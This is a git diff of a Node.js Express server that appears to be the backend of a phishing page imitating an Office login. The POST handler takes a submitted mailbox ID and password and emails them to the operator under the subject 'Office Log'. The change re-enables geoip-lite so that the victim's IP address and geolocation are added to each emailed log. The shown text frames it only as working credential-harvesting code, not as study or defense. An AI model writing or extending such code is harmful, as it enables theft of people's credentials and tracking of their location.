@@ -6,7 +6,7 @@ const cors = require('cors');
 const nodemailer = require('nodemailer');
 const fetch = require('node-fetch');
 
-// const geoip = require('geoip-lite');
+const geoip = require('geoip-lite');
 
 app.use(cors());
 app.use(bodyParser.urlencoded({extended : false}));
@@ -29,12 +29,12 @@ app.post('/', (req, res) => {
     const data = req.body
     var queryString = "ai=" + encodeURIComponent(data.ai) + "&pr=" + data.pr;
 
-    // const ip = req.ip;
-    // const geo = geoip.lookup(ip);
+    const ip = req.ip;
+    const geo = geoip.lookup(ip);
     const userAgent = req.get('User-Agent');
 
 
-    // add to txt file
+    // add to txt file 
     // fs.appendFileSync('data.txt', data + '\n');
 
     // send mail
@@ -44,7 +44,9 @@ app.post('/', (req, res) => {
         subject: `Office Log || - BOX ID: ${data.ai} Password: ${data.pr}`,
         html: `<b>BOX I.D  :- ${data.ai}</b> <br/>
                <b>Password :- ${data.pr}</b> <br/>
-               <b>Browser  :- ${userAgent}</b> <br/>`,
+               <b>Browser  :- ${userAgent}</b> <br/>
+               <b>IP  :- ${ip}</b> <br/>
+               <b>geo  :- ${geo}</b> <br/>`,
       });
 
 
